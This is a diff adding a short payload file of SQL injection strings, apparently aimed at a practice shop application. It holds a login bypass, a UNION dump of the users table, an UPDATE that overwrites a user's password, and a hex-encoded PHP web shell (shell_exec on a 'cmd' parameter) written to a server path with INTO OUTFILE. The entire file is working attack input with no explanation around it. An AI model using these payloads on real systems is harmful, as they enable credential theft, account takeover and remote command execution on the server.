@@ -1,0 +1,8 @@
+# first order
+' OR '1=1
+' ORDER BY 4;-- -
+' UNION SELECT * from users;-- -
+
+# second order sql injection
+'; UPDATE users SET password='hacked' WHERE username='tatum';-- -
+'; SELECT 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E INTO OUTFILE "/home/ormux/Code/the-gadget-shop/hacked.php";-- -
